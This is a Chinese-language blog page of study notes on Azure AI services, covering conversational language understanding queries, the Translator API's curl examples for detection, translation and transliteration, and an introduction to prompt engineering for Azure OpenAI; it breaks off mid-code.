1&#123;ENDPOINT&#125;/language/authoring/analyze-conversations/projects/&#123;PROJECT-NAME&#125;/deployments/&#123;DEPLOYMENT-NAME&#125;/jobs/&#123;JOB-ID&#125;?api-version=&#123;API-VERSION&#125; 占位符 值 &#123;ENDPOINT&#125; 用于对 API 请求进行身份验证的终结点 &#123;PROJECT-NAME&#125; 项目名称（值区分大小写） &#123;DEPLOYMENT-NAME&#125; 部署名称（值区分大小写） &#123;JOB-ID&#125; 用于查找模型训练状态的 ID，可在上文部署请求中详述的标头值中找到 &#123;API-VERSION&#125; 要调用的 API 版本 响应正文将提供部署状态详细信息。 当部署完成时，status 字段的值会为“已成功”。 1234567&#123; &quot;jobId&quot;:&quot;&#123;JOB-ID&#125;&quot;, &quot;createdDateTime&quot;:&quot;String&quot;, &quot;lastUpdatedDateTime&quot;:&quot;String&quot;, &quot;expirationDateTime&quot;:&quot;String&quot;, &quot;status&quot;:&quot;running&quot;&#125; 若要查看示例请求的每个步骤的完整演练，请参阅对话理解快速入门。 查询你的模型若要查询模型以进行预测，可以使用 C# 或 Python 中的 SDK，也可以使用 REST AP。 使用 SDK 进行查询若要使用 SDK 查询你的模型，你首先需要创建客户端。 具有客户端后，即可使用它来调用相应的终结点。 12var languageClient = new TextAnalyticsClient(endpoint, credentials);var response = languageClient.ExtractKeyPhrases(document); 1234language_client = TextAnalyticsClient( endpoint=endpoint, credential=credentials)response = language_client.extract_key_phrases(documents = documents)[0] 其他语言功能（例如对话语言理解）要求以不同的方式构建和发送请求。 123456789101112131415161718192021var data = new&#123; analysisInput = new &#123; conversationItem = new &#123; text = userText, id = &quot;1&quot;, participantId = &quot;1&quot;, &#125; &#125;, parameters = new &#123; projectName, deploymentName, // Use Utf16CodeUnit for strings in .NET. stringIndexType = &quot;Utf16CodeUnit&quot;, &#125;, kind = &quot;Conversation&quot;,&#125;;Response response = await client.AnalyzeConversationAsync(RequestContent.Create(data)); 1234567891011121314151617181920result = client.analyze_conversation( task=&#123; &quot;kind&quot;: &quot;Conversation&quot;, &quot;analysisInput&quot;: &#123; &quot;conversationItem&quot;: &#123; &quot;participantId&quot;: &quot;1&quot;, &quot;id&quot;: &quot;1&quot;, &quot;modality&quot;: &quot;text&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: query &#125;, &quot;isLoggingEnabled&quot;: False &#125;, &quot;parameters&quot;: &#123; &quot;projectName&quot;: cls_project, &quot;deploymentName&quot;: deployment_slot, &quot;verbose&quot;: True &#125; &#125;) 使用 REST API 进行查询若要使用 REST 查询你的模型，请使用指定的相应正文创建对相应 URL 的 POST 请求。 对于内置功能（如语言检测或情绪分析），你将查询 analyze-text 终结点。 提示 请记住，每个请求都需要使用 Ocp-Apim-Subscription-Key 标头中的 Azure AI 语言资源密钥进行身份验证 1&#123;ENDPOINT&#125;/language/:analyze-text?api-version=&#123;API-VERSION&#125; 占位符 值 &#123;ENDPOINT&#125; 用于对 API 请求进行身份验证的终结点 &#123;API-VERSION&#125; 要调用的 API 版本 在该请求的正文中，必须指定 kind 参数，该参数告知服务你所请求的语言理解类型。 例如，如果想要检测语言，则 JSON 正文将如下所示。 1234567891011121314&#123; &quot;kind&quot;: &quot;LanguageDetection&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;:&#123; &quot;documents&quot;:[ &#123; &quot;id&quot;:&quot;1&quot;, &quot;text&quot;: &quot;This is a document written in English.&quot; &#125; ] &#125;&#125; 其他语言功能（例如对话语言理解）要求将请求路由到其他终结点。 例如，对话语言理解请求将被发送到以下位置。 1&#123;ENDPOINT&#125;/language/:analyze-conversations?api-version=&#123;API-VERSION&#125; 占位符 值 &#123;ENDPOINT&#125; 用于对 API 请求进行身份验证的终结点 &#123;API-VERSION&#125; 要调用的 API 版本 该请求将包含类似于以下内容的 JSON 正文。 123456789101112131415&#123; &quot;kind&quot;: &quot;Conversation&quot;, &quot;analysisInput&quot;: &#123; &quot;conversationItem&quot;: &#123; &quot;id&quot;: &quot;1&quot;, &quot;participantId&quot;: &quot;1&quot;, &quot;text&quot;: &quot;Sample text&quot; &#125; &#125;, &quot;parameters&quot;: &#123; &quot;projectName&quot;: &quot;&#123;PROJECT-NAME&#125;&quot;, &quot;deploymentName&quot;: &quot;&#123;DEPLOYMENT-NAME&#125;&quot;, &quot;stringIndexType&quot;: &quot;TextElement_V8&quot; &#125;&#125; 占位符 值 &#123;PROJECT-NAME&#125; 生成模型的项目的名称 &#123;DEPLOYMENT-NAME&#125; 部署的名称 示例响应来自 SDK 的查询响应将出现在返回的对象中，具体取决于功能（例如在 response.key_phrases 或 response.Value 中）。 REST API 将返回类似于以下内容的 JSON。 123456789101112&#123; &quot;kind&quot;: &quot;KeyPhraseExtractionResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;: [&#123; &quot;id&quot;: &quot;1&quot;, &quot;keyPhrases&quot;: [&quot;modern medical office&quot;, &quot;Dr. Smith&quot;, &quot;great staff&quot;], &quot;warnings&quot;: [] &#125;], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;&#123;VERSION&#125;&quot; &#125;&#125; 对于对话语言理解等其他模型，对查询的示例响应将类似于以下内容。 1234567891011121314151617181920212223242526272829&#123; &quot;kind&quot;: &quot;ConversationResult&quot;, &quot;result&quot;: &#123; &quot;query&quot;: &quot;String&quot;, &quot;prediction&quot;: &#123; &quot;topIntent&quot;: &quot;intent1&quot;, &quot;projectKind&quot;: &quot;Conversation&quot;, &quot;intents&quot;: [ &#123; &quot;category&quot;: &quot;intent1&quot;, &quot;confidenceScore&quot;: 1 &#125;, &#123; &quot;category&quot;: &quot;intent2&quot;, &quot;confidenceScore&quot;: 0 &#125; ], &quot;entities&quot;: [ &#123; &quot;category&quot;: &quot;entity1&quot;, &quot;text&quot;: &quot;text&quot;, &quot;offset&quot;: 7, &quot;length&quot;: 4, &quot;confidenceScore&quot;: 1 &#125; ] &#125; &#125;&#125; Python 和 C# 的 SDK 返回与 REST 响应非常相似的 JSON。 有关功能的完整文档（包括示例和操作指南），请参阅 Azure AI 语言文档的文档页。 定义意向、言语和实体语句是用户在与使用语言模型的应用程序进行交互时可能输入的短语。 意向表示用户想执行的任务或操作，或更简单地表示言语的含义。 通过定义意向并将其与一个或多个言语关联来创建模型。 例如，考虑下面包含意向和关联言语的列表： GetTime： “What time is it?” “What is the time?” “Tell me the time” GetWeather： “What is the weather forecast?” “Do I need an umbrella?” “Will it snow?” TurnOnDevice “Turn the light on.” “Switch on the light.” “Turn on the fan” 无： “Hello” “Goodbye” 在你的模型中，你必须定义你希望模型能够理解的意向，因此请花一些时间思考模型必须支持的领域，以及用户可能请求的操作或信息类型。 除了你定义的意向之外，每个模型还包括“无”意向，应使用该意向来显式标识用户可能提交的言语，但不需要为其执行特定操作（例如，“hello”之类的对话问候语）或超出此模型的域范围。 确定模型必须支持的目标后，务必要为每个意向捕获各种不同的示例言语。 收集你认为用户将输入的言语；包括含义相同，但用不同方式构造而成的言语。 请牢记这些准则： 捕获多个不同的示例或同一事物的不同说法 采用不同的言语长度：短、中、长 使言语中的名词或主体位于不同位置。 将其放在开头、末尾或中间 在不同的言语中使用正确的和不正确的语法来提供良好的训练数据示例 标记数据的精度、一致性和完整性是确定模型性能的关键因素。 精确标记：始终将每个实体标记为正确的类型。 仅包含要提取的内容，避免标签中出现不必要的数据。 一致标记：同一实体在所有语句中都应具有相同的标记。 完全标记：标记所有语句中实体的所有实例。 实体用于向意向添加特定上下文。 例如，可以定义可应用于多个设备的 TurnOnDevice 意向，并使用实体定义不同的设备。 请考虑以下言语、意向和实体： 话语 意向 实体 What is the time? GetTime What time is it in London? GetTime Location (London) What’s the weather forecast for Paris? GetWeather Location (Paris) Will I need an umbrella tonight? GetWeather Time (tonight) What’s the forecast for Seattle tomorrow? GetWeather Location (Seattle), Time (tomorrow) Turn the light on. TurnOnDevice Device (light) Switch on the fan. TurnOnDevice Device (fan) 可以将实体拆分为几个不同的组件类型： 学习实体是最灵活的实体类型，应在大多数情况下使用。 使用合适的名称定义学习组件，然后在训练言语中将单词或短语与该实体关联。 训练模型时，将了解如何将言语中的相应元素与实体匹配。 当需要具有一组特定可能值（例如，一周中的几天）的实体时，列表实体非常有用。 可以在列表实体定义中包括同义词，以便可以定义包括“Sunday”、“Monday”、“Tuesday”等值的 DayOfWeek 实体；每个都有同义词，例如“Sun”、“Mon”、“Tue”等。 预生成的实体对于数字、日期&#x2F;时间和名称等常见类型非常有用。 例如，添加预生成组件时，会自动检测“6”等值或“Microsoft”等组织。 有关受支持的预生成实体的列表，请参阅本文。 使用模式区分相似的言语在某些情况下，模型可能包含多个意向，这些意向的言语可能相似。 可以使用语句模式来区分意向，同时最大限度地减少示例言语的数量。 例如，考虑以下言语： “Turn on the kitchen light” “Is the kitchen light on?” “Turn off the kitchen light” 这些言语在语法上相似，但在单词或标点符号方面只有一些差异。 但是，它们表示三个不同的意向（分别为 TurnOnDevice、GetDeviceStatus 和 TurnOffDevice）。 此外，意向可应用于各种实体值。 除了“厨房灯”之外，意向还适用于“客厅灯”、“电视”或可能需要模型来提供支持的任何其他设备。 若要正确训练模型，请提供一些指定不同格式言语的意向示例。 TurnOnDevice： “Turn on the {DeviceName}” “在 {DeviceName} 上切换” “Turn the {DeviceName} on” GetDeviceStatus： “Is the {DeviceName} on[?]” TurnOffDevice： “Turn the {DeviceName} off” “Switch off the {DeviceName}” “Turn off the {DeviceName}” 在使用每种不同类型的言语来训练模型时，Azure AI 语言服务可以学习如何根据格式和标点正确地对意图进行分类。 使用预生成的实体组件可以通过定义所需的所有意向和语句来创建自己的语言模型，但通常可以使用预生成组件来检测常见实体，例如数字、电子邮件、URL 或选择。 有关 Azure AI 语言服务可以检测的预生成实体的完整列表，请参阅受支持的预生成实体组件列表。 使用预生成组件，可以让 Azure AI 语言服务自动检测指定类型的实体，且不必使用该实体的示例来训练模型。 若要添加预生成组件，可以在项目中创建实体，然后选择该实体的“添加新预生成”以检测某些实体。 每个实体最多可以包含 5 个预生成组件。 使用预生成模型元素可以显著减少开发对话语言理解解决方案所需的时间。 训练、测试、发布和查看对话语言理解模型创建模型是一个迭代过程，包括以下活动： 训练模型以从示例言语中学习意向和实体。 以交互式方式或使用带有已知标签的测试数据集测试模型 将经过训练的模型部署到公共终结点以供客户端应用使用 查看预测并迭代访问语句以训练模型 通过遵循此迭代方法，你可以根据用户输入随着时间的推移而改进语言模型，从而帮助开发反映用户使用自然语言指示其意向的方式的解决方案。 言语是指示特定意向的示例短语。 城市是应该应用意向（预订航班）的实体。 当语言模型需要检测公共实体时，请使用预生成组件让 Azure AI 语言服务自动检测实体。 使用 Azure AI 翻译服务翻译文本 世界上有许多常用语言，在不同语言的发言人之间交换信息的功能通常是全球解决方案的关键要求。 Azure AI 翻译提供了一个 API，用于在支持的 90 种语言之间翻译文本。 完成此模块后，你将能够： 预配 Azure AI 翻译资源了解语言检测、翻译和音译指定翻译选项定义并运行自定义翻译 预配 Azure AI 翻译资源​Azure AI 翻译提供了多语言文本翻译 API，可用于：​ 语言检测。 一对多翻译。 脚本音译（将本机脚本中的文本转换为替代脚本）。​​ 适用于 Azure AI 翻译的 Azure 资源​若要使用 Azure AI 翻译服务，必须在 Azure 订阅中为其预配资源。 可以预配单服务 Azure AI 翻译资源，也可以在多服务 Azure AI 服务资源中使用文本分析 API。​在 Azure 订阅中预配适当的资源后，可以使用部署资源的位置及其订阅密钥之一从代码中调用 Azure AI 翻译 API。 可以通过向 REST 接口提交 JSON 格式的请求，或者通过使用特定于编程语言的任何可用 SDK 来调用 API。​注意​本模块的后续单元中的代码示例显示了与 REST 接口交换的 JSON 请求和响应。 使用 SDK 时，会通过用于封装相同数据值的适当对象和方法对 JSON 请求进行抽象。 在本模块后面的练习中，你将有机会亲自尝试使用适用于 C# 或 Python 的 SDK。​ 了解语言检测、翻译和音译让我们来探索 Azure AI 翻译的功能。 这些功能包括： 语言检测可使用 REST API 的 Detect 函数来检测编写文本所用的语言。 例如，可使用 curl 将以下文本提交到 https://api.cognitive.microsofttranslator.com/detect?api-version=3.0 终结点。 下面是要翻译的文本： 1&#123; &#x27;Text&#x27; : &#x27;こんにちは&#x27; &#125; 下面是使用 curl 对终结点的调用，目的是检测文本的语言： 1curl -X POST &quot;https://api.cognitive.microsofttranslator.com/detect?api-version=3.0&quot; -H &quot;Ocp-Apim-Subscription-Region: &lt;your-service-region&gt;&quot; -H &quot;Ocp-Apim-Subscription-Key: &lt;your-key&gt;&quot; -H &quot;Content-Type: application/json&quot; -d &quot;[&#123; &#x27;Text&#x27; : &#x27;こんにちは&#x27; &#125;] 对此请求的响如下所示，表示文本使用日语编写： 12345678910[ &#123; &quot;language&quot;: &quot;ja&quot;, &quot;score&quot;: 1.0, &quot;isTranslationSupported&quot;: true, &quot;isTransliterationSupported&quot;: true &#125;] 翻译若要将文本从一种语言翻译为另一种语言，请使用 Translate 函数；指定一个 from 参数来指示源语言，并指定一个或多个 to 参数，以指定文本翻译的目标语言。 例如，你可以提交之前用于检测语言的相同 JSON，从而指定 ja（日语）的 from 参数以及值为 En（英语）和 fr（法语）的两个 to 参数。 为此，需要调用： 1curl -X POST &quot;https://api.cognitive.microsofttranslator.com/translate?api-version=3.0&amp;from=ja&amp;to=fr&amp;to=en&quot; -H &quot;Ocp-Apim-Subscription-Key: &lt;your-key&gt;&quot; -H &quot;Ocp-Apim-Subscription-Region: &lt;your-service-region&gt;&quot; -H &quot;Content-Type: application/json; charset=UTF-8&quot; -d &quot;[&#123; &#x27;Text&#x27; : &#x27;こんにちは&#x27; &#125;]&quot; 这将生成以下结果： 12345678[ &#123;&quot;translations&quot;: [ &#123;&quot;text&quot;: &quot;Hello&quot;, &quot;to&quot;: &quot;en&quot;&#125;, &#123;&quot;text&quot;: &quot;Bonjour&quot;, &quot;to&quot;: &quot;fr&quot;&#125; ] &#125;] 音译日语文本是使用平假名脚本编写的，因此，你可能想要将其翻译为不同的脚本，而不是将其翻译为不同的语言，例如，使用拉丁脚本（如英语语言文本所使用）呈现文本。 为实现此目的，我们可以使用 Jpan 的 fromScript 参数和 Latn 的 toScript 参数将日语文本提交到 Transliterate 函数： 1curl -X POST &quot;https://api.cognitive.microsofttranslator.com/transliterate?api-version=3.0&amp;fromScript=Jpan&amp;toScript=Latn&quot; -H &quot;Ocp-Apim-Subscription-Key: &lt;your-key&gt;&quot; -H &quot;Ocp-Apim-Subscription-Region: &lt;your-service-region&gt;&quot; -H &quot;Content-Type: application/json&quot; -d &quot;[&#123; &#x27;Text&#x27; : &#x27;こんにちは&#x27; &#125;]&quot; 响应会提供以下结果： 123456[ &#123; &quot;script&quot;: &quot;Latn&quot;, &quot;text&quot;: &quot;Kon&#x27;nichiwa&quot; &#125;] 指定翻译选项API 的 Translate 函数支持多个影响输出的参数。 单词对齐方式在书面英语（使用拉丁脚本）中，空格用于分隔单词。 但是，在某些其他语言（更具体地说，脚本）中，并非总是如此。 例如，将“Smart Services”从 en（英语）翻译为 zh（简体中文）会生成结果“智能服务”，并且很难理解源文本中的字符与翻译中的相应字符之间的关系。 若要解决此问题，可以在调用中指定值为 true 的 includeAlignment 参数来生成以下结果： 12345678910111213[ &#123; &quot;translations&quot;:[ &#123; &quot;text&quot;:&quot;智能服务&quot;, &quot;to&quot;:&quot;zh-Hans&quot;, &quot;alignment&quot;:&#123; &quot;proj&quot;:&quot;0:4-0:1 6:13-2:3&quot; &#125; &#125; ] &#125;] 这些结果告诉我们，源中的字符 0 到 4 对应于翻译中的字符 0 到 1，而源中的字符 6 到 13 对应于翻译中的字符 2 到 3。 句子长度有时，知道翻译长度可能会很有用，例如，确定如何在用户界面中以最佳方式显示它。 可以通过将 includeSentenceLength 参数设置为 true 来获取此信息。 例如，在将英语 (en) 文本“Hello world”翻译成法语 (fr) 时指定此参数将产生以下结果： 1234567891011[ &#123; &quot;translations&quot;:[ &#123; &quot;text&quot;:&quot;Salut tout le monde&quot;, &quot;to&quot;:&quot;fr&quot;, &quot;sentLen&quot;:&#123;&quot;srcSentLen&quot;:[12],&quot;transSentLen&quot;:[20]&#125; &#125; ] &#125;] 猥亵语言过滤有时，文本包含猥亵语言，你可能希望在翻译中完全掩盖或省略它。 可以通过指定 profanityAction 参数来处理猥亵语言，该参数可以具有以下值之一： NoAction：猥亵语言与文本的其余部分一起翻译。 Deleted：翻译中省略了猥亵语言。 Marked：使用 profanityMarker 参数（如果提供）中所指示的方法来指示猥亵语言。 此参数的默认值为“Asterisk”，这会将猥亵语言中的字符替换为“*”。 作为替代方法，你可以将“标记”的值指定为 profanityMarker，这会将猥亵语言括在 XML 标记中。 例如，使用 Marked 的 profanityAction 和 Asterisk 的 profanityMarker 将英语 (en) 文本“JSON is ▇▇▇▇ great!”（其中，被挡住的单词是猥亵语言）翻译为德语 (de) 会产生以下结果： 12345678910[ &#123; &quot;translations&quot;:[ &#123; &quot;text&quot;:&quot;JSON ist *** erstaunlich.&quot;, &quot;to&quot;:&quot;de&quot; &#125; ] &#125;] 定义自定义翻译Azure AI 翻译使用的默认翻译模型对于常规内容的翻译较有效，但你可能需要为使用专业术语词汇的企业或行业开发翻译解决方案，这就需要用到自定义翻译。 若要解决此问题，可以创建用于映射自己的源和目标术语集进行翻译的自定义模型。 若要创建自定义模型，请使用自定义翻译工具门户来执行以下操作： 创建工作区并链接到 Azure AI 翻译资源。 创建项目。 上传训练数据文件和训练模型。 测试模型和发布模型。 对 API 进行翻译调用。 将为自定义模型分配唯一的类别 ID（屏幕截图中突出显示），可以使用 category 参数在对 Azure AI 翻译资源的翻译调用中指定该 ID，从而使用自定义模型（而不是默认模型）执行翻译。 如何调用 API若要启动翻译，请将 POST 请求发送到以下请求 URL： 1https://api.cognitive.microsofttranslator.com/translate?api-version=3.0 请求需要包含几个参数： api-version：所需的 API 版本。 to：要翻译到的目标语言。 例如： 法语为 to=fr。 category：类别 ID。 请求还需要包含多个必需的标头： Ocp-Apim-Subscription-Key。 客户端密钥的标头。 例如：Ocp-Apim-Subscription-Key=&lt;your-client-key&gt;。 Content-Type。 有效负载的内容类型。 要求的格式：Content-Type: application/json; charset=UTF-8。 请求正文应包含一个数组，该数组包含一个 JSON 对象，该对象具有用于指定要翻译的文本的 Text 属性： 123[ &#123;&quot;Text&quot;:&quot;Where can I find my employee details?&quot;&#125;] 有多种不同方式可用于将请求发送到 API，包括使用 C#、Python 和 curl。 例如，若要进行快速调用，可以使用 curl 发送 POST 请求： 1curl -X POST &quot;https://api.cognitive.microsofttranslator.com/translate?api-version=3.0&amp;from=en&amp;to=nl&amp;category=&lt;category-id&gt;&quot; -H &quot;Ocp-Apim-Subscription-Key: &lt;your-key&quot; -H &quot;Content-Type: application/json; charset=UTF-8&quot; -d &quot;[&#123;&#x27;Text&#x27;:&#x27;Where can I find my employee details?&#x27;&#125;]&quot; 上述请求执行了一个将句子从英语翻译为荷兰语的调用。 返回的响应如果请求成功，响应返回响应代码 200。 还会返回包含已翻译文本的响应正文，如下所示： 1234567[ &#123; &quot;translations&quot;:[ &#123;&quot;text&quot;:&quot;Waar vind ik mijn personeelsgegevens?&quot;,&quot;to&quot;:&quot;nl&quot;&#125; ] &#125;] 如果请求不成功，会根据错误类型返回不同的状态代码，例如 400（缺少或无效的查询参数）。 有关代码及其说明的完整列表，请参阅响应状态代码。 https://learn.microsoft.com/en-us/credentials/applied-skills/build-natural-language-solution-azure-ai/#applied-skill-take-the-assessment","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"Azure OpenAI Generative AI Performance Tuning","slug":"Azure-OpenAI性能优化","date":"2024-06-04T16:02:33.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/05/Azure-OpenAI性能优化/","permalink":"https://banjinmei.github.io/2024/06/05/Azure-OpenAI%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","excerpt":"","text":"Azure OpenAI 服务应用提示工程Azure OpenAI 中 AI 模型的响应质量取决于提供的提示的质量。 通过各种技术提高提示质量称为提示工程。 在本模块中，你将了解提示工程以及如何使用它来优化 Azure OpenAI 模型的性能。 提示工程涉及设计和优化提示，以更好地利用 Azure OpenAI 模型。 了解提示工程发送到 AI 模型的输入提示的质量（如 Azure OpenAI 中提供的提示）会直接影响返回的内容的质量。 通过仔细构造发送到模型的提示，模型可以提供更好、更有趣的响应。 什么是提示工程生成式 AI 模型基于大量数据训练，可以根据提示的最有可能的延续生成文本、图像、代码和创意内容。 提示工程是设计和优化提示以更好地利用 AI 模型的过程。 设计有效的提示对于提示工程的成功至关重要，它可以显著提高 AI 模型在特定任务上的性能。 提供相关、具体、明确且结构良好的提示可以帮助模型更好地了解上下文并生成更准确的响应。 例如，如果我们希望 OpenAI 模型生成产品说明，我们可以为其提供详细说明，描述产品的功能和优势。 通过提供此上下文，模型可以生成更准确、更相关的产品说明。 提示工程还有助于缓解 AI 模型中的偏差并提高公平性。 通过设计具有多样性和包容性的提示，我们可以确保模型不会偏向于特定组或透视。 重要 无论可以设计多好的提示，AI 模型的响应都不应被视为事实或完全没有偏差。 始终负责地使用 AI。 有关详细信息，请参阅 Microsoft 关于 Azure OpenAI 的透明度说明和 Microsoft 的 AI 原则。 此外，提示工程可以帮助我们了解模型用来生成其响应的引用。 生成式 AI 模型具有大量参数，并且其遵循的逻辑对用户来说基本上是未知的，因此可能会对它如何得出响应感到困惑。 通过设计易于理解和解释的提示，可以帮助人类更好地了解模型如何生成其响应。 这在医疗保健等领域尤其重要，因此了解模型如何做出决策至关重要。 设计自己的提示时，可以使用不同的方法，其中许多方法在本模块的后续单元中进行了介绍。 其中包括提供说明、上下文内容、提示或少量示例，以及对提示中的内容进行正确排序。 此处介绍的方法并不详尽，因为此领域是一个微妙而流畅的主题。 API 终结点的注意事项本模块其余部分的示例将重点介绍 ChatCompletion。 值得注意的是，ChatCompletion 也可用于非聊天场景，其中任何说明都包含在系统消息中，用户内容在用户角色消息中提供。 如有需要，其中大多数示例可以改为使用 Completion 终结点。 就模型可用性而言，Completion 终结点可以用于 gpt-3 和更早版本，而 ChatCompletion 可用于 gpt-35-turbo 和更高版本的模型。 调整模型参数除了本模块中讨论的技术外，调整模型参数可能会对响应产生重大影响。 特别是，temperature 和 top_p (top_probability) 最有可能影响模型的响应，因为它们都控制模型中的随机性，但方式不同。 值越高，响应的创造性和随机性就越高，但可能不太一致或不太集中。 预期为虚构或唯一的响应受益于这些参数的较高值，而需要更一致且具体的内容应使用较低的值。 尝试使用相同的提示调整这些参数，以查看它们如何影响响应。 建议一次更改 temperature 或 top_p，但不能同时更改两者。 编写更有效的提示Azure OpenAI 模型能够以惊人的准确度生成对自然语言查询的响应。 但是，响应的质量在很大程度上取决于提示的写入程度。 开发人员可以通过在其提示中使用不同技术来优化 Azure OpenAI 模型的性能，从而生成更准确、更相关的响应。 提供清晰说明明确询问 Azure OpenAI 模型所需的内容是获取所需结果的一种方法。 通过尽可能的描述，模型可以生成最符合所需内容的响应。 例如，假设你想要为新的水瓶创建产品说明。 请考虑与每个提示关联的答案： 提示 1Write a product description for a new water bottle 响应 1234567Introducing the latest addition to our product line - the innovative and eco-friendly water bottle.Made from high-quality, BPA-free materials, this bottle is designed to keep your beverages at theperfect temperature for hours. Its sleek and stylish design makes it the perfect accessory for anyoutdoor activity or workout session. With its convenient carrying handle and leak-proof lid, you can take it with you wherever you go, without worrying about spills or leaks. Plus, its easy-to-cleandesign ensures that you can use it again and again, making it the perfect choice for anyone looking for a reliable and sustainable water bottle. 与类似的提示相比，具有清晰说明。 提示 123Write a product description for a new water bottle that is 100% recycled. Be sure to include thatit comes in natural colors with no dyes, and each purchase removes 10 pounds of plastic from our oceans 响应 1234567Introducing our newest water bottle, the eco-friendly choice for the conscious consumer. Made from 100% recycled materials and available in natural colors with no dyes, this bottle is not only stylish but also sustainable. Each purchase of this bottle removes 10 pounds of plastic from our oceans, making it a responsible choice for those who care about the environment. Its durable and leak-proof design makes it perfect for outdoor activities, while its easy-to-carry handle makes it convenient to take on the go. Join us in our mission to reduce plastic waste and choose this eco-friendly water bottle for your daily hydration needs. 包括需要包含的详细信息可让模型知道要添加到说明中的信息，使其对新产品的描述更加准确。 可以推断此方法包含复杂的说明，例如要包括的详细信息的项目符号列表、响应的长度或要包含在输出中的所需格式。 尝试确切地询问想要在结果中看到的内容，你可能会对模型满足请求的效果感到惊讶。 说明的格式如何设置说明的格式可能会影响模型解释提示的方式。 近度偏差可能会影响模型，其中位于提示末尾的信息对输出的影响比对开头的信息的影响更大。 通过重复提示末尾的说明和评估对生成的响应的影响，可以获得更好的响应。 在聊天方案中使用 ChatCompletion 时，这种近度偏差也会起作用，其中提示中包含的对话中较新的消息对响应的影响更大。 下一个单元更深入地介绍如何使用对话来提高响应质量，但将重要信息放在提示的末尾附近可能会获得更好的响应。 使用节标记设置说明格式的特定技术是拆分提示开头或末尾的说明，并在 --- 或 ### 块中包含用户内容。 这些标记使模型能够更清楚地区分说明和内容。 例如： 12345Translate the text into French---What&#x27;s the weather going to be like today?--- 注意 分区标记的最佳做法可能会随着将来的版本而更改。 主要内容、支持内容和基础内容包括用于响应的模型的内容，使模型能够更准确地回答。 可以通过两种方式来考虑此内容：主要内容和支持内容。 主要内容是指作为查询主题的内容，例如要翻译的句子或要汇总的文章。 此内容通常包含在提示的开头或末尾（作为说明，并按 --- 块进行区分），其中包含介绍如何使用它的说明。 例如，假设我们有一篇要总结的长文章。 我们可以将其放在提示符的 --- 块中，然后以说明结尾。 12345---&lt;insert full article here, as primary content&gt;---Summarize this article and identify three takeaways in a bulleted list 支持内容是可能会改变响应的内容，但不是提示的焦点或主题。 支持内容的示例包括名称、首选项、响应中要包含的未来日期等。 提供支持内容可让模型做出更完整、更准确的响应，并且更有可能包含所需信息。 例如，鉴于促销电子邮件非常长，模型能够提取关键信息。 如果随后在提示中添加支持内容，并指定要查找的特定内容，则模型可以提供更有用的响应。 在这种情况下，电子邮件是主要内容，并将你感兴趣的具体内容作为支持内容 1234567---&lt;insert full email here, as primary content&gt;---&lt;the next line is the supporting content&gt;Topics I&#x27;m very interested in: AI, webinar dates, submission deadlinesExtract the key points from the above email, and put them in a bulleted list: 基础内容通过为要从中提取答案的模型提供内容，使模型能够提供可靠的答案。 基础内容可以是询问相关问题的论文或文章、公司常见问题解答文档或比训练模型所基于的数据更新的信息。 如果需要更可靠且最新的响应，或者需要引用未发布的或特定信息，强烈建议使用基础内容。 基础内容与主要内容不同，因为它是用于回答提示查询的信息源，而不是针对摘要或翻译等操作的内容。 例如，当提供关于 AI 历史的未发表研究论文时，它可以使用该基础内容回答问题。 12345---&lt;insert unpublished paper on the history of AI here, as grounding content&gt;---Where and when did the field of AI start? 此基础数据使模型能够给出更准确、更明智的答案，这些答案可能不是训练的数据集的一部分。 提示提示是模型构建的前导字，通常有助于朝着正确方向塑造响应。 它们通常与说明一起使用，但并不总是如此。 提示模型进行代码生成时，提示特别有用。 当前的 Azure OpenAI 模型可以生成一些有趣的代码片段，但未来模块中将更深入地介绍代码生成。 例如，如果需要帮助创建 SQL 查询，请提供所需内容的说明以及查询的开头： 123Write a join query to get customer names with purchases in the past 30 days between tables named orders and customer on customer ID. SELECT 模型响应从提示中断的位置开始，在 SQL 中继续，即使我们从未要求过特定语言。 其他示例可能是通过提供有关所需应用的代码注释，并在提示末尾将 import 添加为前导字，或者以所需语言提供类似内容来帮助 Python 代码。 另一个示例，鉴于提示中有大量客户评论，结尾为： 123Summarize the reviews above:Most common complaints:- 提供上下文以提高准确性通过向 AI 模型提供上下文，使模型能够更好地了解你的问题或应该知道的内容，从而提供最佳答案。 可以通过多种方式提供上下文。 请求输出组合指定输出的结构可能会对结果产生很大影响。 这可能包括要求模型引用其来源、将响应编写为电子邮件、将响应格式设置为 SQL 查询、将情绪分类为特定结构等。 例如： 提示 1Write a table in markdown with 6 animals in it, with their genus and species 响应 12345678| Animal | Genus | Species || ---------------- |:--------------:|:--------------:|| Red Panda | Ailurus | fulgens || African Elephant | Loxodonta | africana || Snow Leopard | Panthera | uncia || Arctic Fox | Vulpes | lagopus || Chimpanzee | Pan | troglodytes || Siberian Tiger | Panthera | tigris altaica | 此方法可用于自定义格式，例如 JSON 结构： 提示 123456Put two fictional characters into JSON of the following format&#123; firstNameFictional: jobFictional:&#125; 响应 12345678910Here&#x27;s an example of how you can put two fictional characters into JSON format:&#123; &quot;firstNameFictional&quot;: &quot;Henry&quot;, &quot;jobFictional&quot;: &quot;Wizard&quot;&#125;,&#123; &quot;firstNameFictional&quot;: &quot;Frank&quot;, &quot;jobFictional&quot;: &quot;Hero&quot;&#125; 系统消息系统消息包含在提示的开头，旨在提供模型说明、回答的角度或其他有助于指导模型响应的信息。 此系统消息可能包括音调或个性、不应包含的主题或如何回答的详细信息（例如，格式设置）。 例如，可以向它提供以下一些系统消息： “我希望你像命令行终端一样操作。 在一个唯一代码块中完全像 cmd.exe 一样响应命令，没有其他要求。” “我希望你成为一名翻译，从英语翻译成西班牙语。 不要回复我说或问的任何内容，只翻译这两种语言，并用翻译的文本回复。” “作为励志演说家，自由地就目标和挑战给出令人鼓舞的建议。 你应该包括许多积极的肯定和建议的活动，以实现用户的最终目标。” Azure OpenAI Studio 中聊天窗口顶部提供了其他示例系统消息。 尝试定义自己的系统提示以指定唯一响应，并与模型聊天以查看响应的不同之处。 ChatCompletion 终结点允许使用 System 聊天角色包括系统消息。 12345678var chatCompletionsOptions = new ChatCompletionsOptions()&#123; Messages = &#123; new ChatRequestSystemMessage(&quot;You are a casual, helpful assistant. You will talk like an American old western film character.&quot;), new 